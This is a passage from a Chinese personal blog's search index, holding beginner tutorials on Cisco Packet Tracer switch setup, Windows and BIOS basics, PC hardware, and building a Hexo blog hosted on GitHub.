    <url>%2F2019%2F09%2F24%2F%E6%80%9D%E7%A7%91%E6%A8%A1%E6%8B%9F%E5%99%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[首先下载并安装思科模拟器软件 Cisco Packet Tracer Student 安装好后打开模拟器，根据需求添加设备，然后连接各设备。 点击设备，进入配置界面，进入全局模式en(特权模式)—&gt;conf t（全局模式）; switch&gt; //用户模式，能使用一些简单命令，不能查看当前配置–&gt;en进入特权模式 Switch# //特权模式 –&gt;conf t –》进入全局配置模式 Switch（config）# //全局配置模式 注意：思科模拟器中的所有命令支持简写 基础配置命令：（在全局模式下show命令需要在前面加上do） ​ show mac-address-table //查看MAC地址表 ​ clear mac-address-table //清空MAC地址表 ​ show running-config //查看设备配置信息 ​ hostname 名字 //给交换机改名 ​ show ip interface brief //查看所有接口的状态和配置信息 ​ show flash //查看闪存信息 ​ shutdown //关闭接口连接 ​ no shutdown //重启接口连接 ​ show interface f0/0 //查看f0/0接口的状态信息，接口还可以是e0/0和g0/0 ​ duplex full/half/auto //修改双工模式 ​ speed 10/100/auto //修改接口的速率 ​ end、exit、Ctrl+Z 退出当前模式 ​ show version //查看版本信息 ​ show clock //查看时间 ​ clock set 当前时间点 Aug 21 2019 //设置时间 ​ show history //查看历史命令 ​ show startup-config //交换机每次开机时都会自动加 ​ 载配置，重启后任然有效，永久存储，写入在NVRAM ​ write //保存配置 1.交换机（二层）的配置： telenet远程管理配置步骤： （1）给交换机配置ip【交换机是二层设备，不能直接在接口配置IP地址，需要在虚拟接口配置IP地址】 ​ conf t //进入全局配置模式 ​ host Sw1 //改名叫Sw1 ​ int vlan 1 //进入交换机的默认虚拟接口1 ​ ip add 192.168.1.100 255.255.255.0 //配置IP地址 ​ no sh //激活接口 （2）配置telenet远程登录 ​ line vty 0 4 // 配置telenet，0表示第一个虚拟接 ​ 口，4表示最多允许登录的人数 ​ password 123456 //设置远程登录的密码 ​ login //激活 （3）设置进入特权模式的密码 ​ enable password 456789 //password表示明文密码 ​ enable secret 123456 //secret表示密文密码 ​ 如果两个都存在，那么密文生效； ssh远程管理配置： ​ conf t //进入全局配置模式 ​ hostname SW1 //设置主机名 ​ username test password 123 //设置登录的用户和密码 ​ ip domain-name www.test.cpm //配置域名，域名用来生成公钥和私钥 ​ crypto key generate rsa //生成一对rsa算法的公钥和私钥 ——–》输入1024 ​ line vty 0 4 //配置远程登录 ​ transport input ssh/all 只开启ssh远程登录或所有 ​ login local //登录到本地 ​ exit //退出 ​ ssh -l test 192.168.1.254 //在模拟pc上使用ssh连接设备 本地安全配置：（给console口做安全配置） ​ line console 0 //开启console 0接口 ​ exec-timeout 0 0 //设置超时时间，第一个0表示分钟，第二个0表示秒，0 0 表示哟永不超时，仅限于实验环境 ​ password 123456 //设置console的登录密码 ​ logging synchronous //设置光标跟随，不让命令被日志信息打断 ​ login //激活 ​ no ip domain-lookup // 关闭域名解析 ​ erase startup-config //清空所有配置 ​ ​ ​ ​]]></content>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统基础]]></title>
    <url>%2F2019%2F07%2F27%2FLinux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[]]></content>
      <tags>
        <tag>Linux系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows系统基础]]></title>
    <url>%2F2019%2F07%2F25%2FWindows%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[1.BIOS：基本输入输出系统，用来存储计算机基本硬件信息，BIOS程序存储在CMOS芯片中。 ​ 重启电脑后按F2进入BIOS程序（不同的厂商/型号的电脑进入BIOS的按键不同） 2.BIOS的启动过程:（1）加电自检：检测硬件是否有问题 （2）初始化 （3）引导操作系统 3.Windows版本分类：​ 纯净版系统： 仅安装了windows系统，其效果如同用原版盘安装，而不同时安装第三方常用软件(类似迅雷,QQ,和word,EXCEL等软件)并对系统中并不常用的组件进行优化。纯净版系统比其他Ghost系统体积更小，没有自带软件，运行更加流畅。 ​ ghost系统： Ghost系统是指通过赛门铁克公司（Symantec Corporation）出品的Ghost在装好的操作系统中进行镜像克隆的版本，通常GHOST用于操作系统的备份，在系统不能正常启动的时候用来进行恢复的。但这种安装方式可能会造成系统不稳定。 Ghost系统就是基于原版系统对原版系统的缺点进行改正或diy设置，取出了一些系统垃圾，比如无用的输入法等，添加常用的软件补丁及驱动。 通常Ghost版系统会自动安装驱动，安装方便速度较快，比较人性化。 Ghost系统的缺点也很明显，取决于制作者： 网络上制作者水平不一，如果采用的封装技术好，做的优化比较合适，这种系统比原版的还好。 若水平较低，做的优化不合理，删除一些有用的功能等也会带来一些麻烦。当然也不排除有些作者用心不纯会在系统里面添加后门等。另外在系统ISO镜像里面，Ghost与原版的文件也有很大区别，Ghost系统镜像里面文件通常较多。 ​ 旗舰版系统：旗舰版就是指最高版或全功能版，比如win7旗舰版，它包含了win7的所有功能，其它版本在功能上有所删减，Ultimate版就是旗舰版。]]></content>
      <tags>
        <tag>Windows系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机硬件]]></title>
    <url>%2F2019%2F07%2F24%2F%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[​ 作为计算机领域的学者，不管是出于对游戏的爱好还是亲戚好友的一句“你会修电脑吗？”，我们都应该熟悉和了解计算机硬件。一个计算机领域的学者不了解一些计算机硬件的基本信息算不上合格。此外学会计算机硬件在买电脑的时候也会防止被卖家忽悠；同时也可以根据自己的需求合理组装计算机的配件，感觉起来很有趣。 ​ 上面是凑字数废话了一堆（-*-）；以下是我整理的有关计算机硬件的最基本的相关信息，我们不一定要深入研究计算机，我们只要了解基本信息即可。 1.计算机的五大部件组成： ​ 输入设备（键盘，鼠标，手写板）； ​ 输出设备（显示器，音响，耳机，打印机，投影仪）； ​ 存储器（内存【临时存储】和硬盘【永久存储】）； ​ 运算器 ​ 控制器 2.计算机外部硬件： ​ （1）机箱：保护内部硬件，集成电源（升级硬件要注意电源供给）； ​ （2）CPU风扇：散热—风冷（热量通过硅质导入金属，风扇吹散，价格便宜）和水冷 （散热效果更好，价格昂贵，且害怕液体泄漏） ​ （3）光驱：读取和写入数据 ​ （4）键盘和鼠标：ps2接口（圆形针孔）与usb接口（大多数） 鼠标分为：机械鼠标（动球）、光电鼠标（光感应）、激光鼠标​ （5）显示器：包括LCD（现在使用的，轻捷）和CRT（旧时的大头台式电脑，颜色全） 3.内部重要部件：（爱玩游戏的同学请注意） （1）CPU：中央处理器，负责运算与控制； ​ 核心数：双核，四核；核心数越大越好；（相当于一个人四个头当然比两个头聪明） ​ 目前大多数i5都是双核，i7为4核； ​ 注意：卖家可能会用通道来忽悠卖家是四核，目前大多数为每核双通道； 主频：CPU的运算速度，单位GHZ，主频越高，CPU运算速度越快；​ 缓存：CPU和内存之间的临时存储器，容量小，速度快；目前缓存的大小一般是64M ​ 左右即可；缓存越大越好。读取顺序：一级–&gt;二级–&gt;三级 。 ​ CPU全球量大主流品牌厂商：Intel(美国英特尔公司)和AMD（美国超威半导体公司） ​ 其中Intel的CPU更偏向于高精密计算，AMD的CPU偏向于家庭娱乐方向； ​ Intel的接口类型为触点式，AMD的接口类型为针脚式； （2）主板：为各部件的连接载体（主板的接口类型和数量决定性能：扩展和升级的能力） ​ 接口类型：（1）USB接口：蓝色，3.0接口速度快，5G/s是2.0的10倍 ​ （2）VGA接口 ​ （3）RJ45接口：网卡接口 ​ （4）PATA(IDE)/SATA：硬盘接口，光驱 ​ （5）SCSI接口：硬盘接口（高档工作站、服务器，价格昂贵，支持热插 拔） ​ （6）PCI和PCIE：显卡接口 ​ （7）CPU接口：LGA1633（触点式）和Socket(针脚式) ​ （8）DIMM：内存插槽 （3）内存：负责临时存储，数据交换；容量越大越好 ​ 主频：标志着单位时间内，内存的交换速率 ​ 通道技术：DDR3（第三代）目前一般是DDR4 ​ 注意：电脑升级内存最好要同主频同品牌同型号，以防出现不兼容的问题。 ​ 此外两个内存条大小最好一致，这样能用的时间较长。 （4）显卡：把计算机运算结果转化为影像（画质） ​ 显存：显卡容量，越大越好—–目前16G最大 ​ 位宽： 瞬间传输数据流量，位数越大传输越多；最基本的128； ​ 显卡主流厂商：N卡（NVIDIA英伟达）和A卡（AMD） ​ 关于显卡的性能可以百度显卡性能对比天梯图，这里有一个小技巧， ​ 如GTX和GT比较，GTX更好；860和950比较860更好，860和970比较，970 ​ 更好（主要取决于中间位数，中间为越大越好）；960比1050好，其实1050 ​ 就是披着马甲的950； （5）硬盘：外部存储器，大小1T起步，有机械硬盘（电脑自带）和固态硬盘； ​ 硬盘接口类型：SATA（主流笔记本常用）IDE（光驱，淘汰）SCSI（用户服务器） ​ 容量越大越好，转速越快越好 笔记本（5400）台式（7200） ​ 固态硬盘的优点：芯片由阵列组成，无盘片，读写速度快，散热低，无噪音。 （6）驱动程序：硬件厂商根据操作系统编写配置文件来识别硬件。]]></content>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何搭建个人博客？？]]></title>
    <url>%2F2019%2F07%2F22%2F%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[搭建个人博客我们通常使用Hexo+Github Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 GitHub是一个面向开源及私有软件项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名GitHub。GitHub于2008年4月10日正式上线，除了Git代码仓库托管及基本的 Web管理界面以外，还提供了订阅、讨论组、文本渲染、在线文件编辑器、协作图谱（报表）、代码片段分享（Gist）等功能。 本地Win10搭建环境安装Git(下载安装包，打开后一直下一步到结束就行)https://git-scm.com/download/win检查电脑是否安装了 Git ？Windows + R -&gt; cmd -&gt; 进入 Dos 窗口在 Dos 窗口下，输入以下命令并执行 ：git –version把下列这段代码加入本地hosts文件(一般在c:\windows\system32\drivers\etc)内，加速访问Github网站的速度 GitHub Start192.30.253.112 github.com192.30.253.119 gist.github.com151.101.100.133 assets-cdn.github.com151.101.100.133 raw.githubusercontent.com151.101.100.133 gist.githubusercontent.com151.101.100.133 cloud.githubusercontent.com151.101.100.133 camo.githubusercontent.com151.101.100.133 avatars0.githubusercontent.com151.101.100.133 avatars1.githubusercontent.com151.101.100.133 avatars2.githubusercontent.com151.101.100.133 avatars3.githubusercontent.com151.101.100.133 avatars4.githubusercontent.com151.101.100.133 avatars5.githubusercontent.com151.101.100.133 avatars6.githubusercontent.com151.101.100.133 avatars7.githubusercontent.com151.101.100.133 avatars8.githubusercontent.com GitHub End安装Nodejs(下载安装包，打开后一直下一步到结束就行)http://nodejs.cn/download/检查电脑是否安装了 Node.js ？Windows + R -&gt; cmd -&gt; 进入 Dos 窗口在 Dos 窗口下，输入以下命令并执行 ：node -v 下载安装完Git后会出现以下两个图标：![Git base](C:\Users\hp\blog\Git base.png)![Git CMD](C:\Users\hp\blog\Git CMD.png)在git上经常使用的命令如下：hexo generate (hexo g) 生成静态文件$ hexo server (hexo s) 启动本地服务$ hexo deploy (hexo d) 提交到远程仓库$ hexo new page “xx”(hexo n page) 创建页面$ hexo new “xx” (hexo n “”) 创建文章$ hexo d -g 生成静态并提交到远程仓库$ hexo s -g 生成静态文件并启动本地预览$ hexo clean 清除本地 public 文件 安装Hexo（1）第一步：安装Hexo扩展插件，点击Git Bash,执行以下代码：$ npm install hexo-cli -g$ hexo init blog$ cd blog$ npm install$ hexo server（2）第二步：创建一个 blog 文件夹，下载 hexo 相应的代码到该文件中下。此时目录情况如下 ： node_modules npm 文件缓存目录scaffolds 文夹件下存放的是文章、页面模版scource 文夹件下存放的是我们的资源文件themes 文件下存放的是我们的主题文件.gitignore git 忽略文件，设置提交文件时，哪些文件不提交_config.yml 站点配置文件package.json 站点版本，站点依赖文件yarn.lock yarn.lock 文件由 Yarn 自动创建，并且完全通过 Yarn 进行操作。（3）第三步：进入blog文件夹：输入命令cd blog（4）第四步：安装相关hexo的代码：$ hexo generate (hexo g) 生成静态文件$ hexo server (hexo s) 启动本地服务$ hexo deploy (hexo d) 提交到远程仓库$ hexo new page “xx”(hexo n page) 创建页面$ hexo new “xx” (hexo n “”) 创建文章$ hexo d -g 生成静态并提交到远程仓库$ hexo s -g 生成静态文件并启动本地预览$ hexo clean 清除本地 public 文件 （5）第五步：启动本地服务，使用Git hash输入命令hexo s -g,完成后如图所示在浏览器输入 http://localhost:4000/ 就可以访问刚刚创建的静态博客了。完成以上这些步骤后就可以建立一个自己能够访问的博客页面。要想其他人也能访问我们的博客的话，需要用到Github。 GitHub注册注册GitHub账号并添加一个远程仓库点击进入https://github.com/官网内注册GitHub账号：注册成功后，登录账号，点击右侧 “+” 号，然后点击 New repository 添加仓库，如图 ：完成上述操作后，点击 Create repository 创建仓库。仓库创建成功后，如图 ：这里有两个地址，一个是 Https，一个是 SSH 。Https 每次提交都需要输入用户名和密码，SSH 只要添加了 SSH key 值，以后提交不需要输入用户名和密码。注 ： 这里创建的仓库名称必须为 username.github.io，username 替换成你的 github 用户名，每个账户有且只有一个仓库用来存放网页静态文件，这里名称是固定的。当创建其他仓库的时候，仓库名称可以自定义。GitHub 添加 SSH key检查本地是否有 SSH key$ cd ~/.ssh$ ls 第一步是进入 .ssh 文件夹，第二步是显示 .ssh 文件下的文件夹及文件。如果 SSH key 存在，就会显示 id_rsa、id_rsa.pub、know_hosts 三个文件 。没有也没关系，下面我们就来创建 SSH key$ ssh-keygen -t rsa -C “你的邮箱”]]></content>
      <tags>
        <tag>个人博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F07%2F20%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
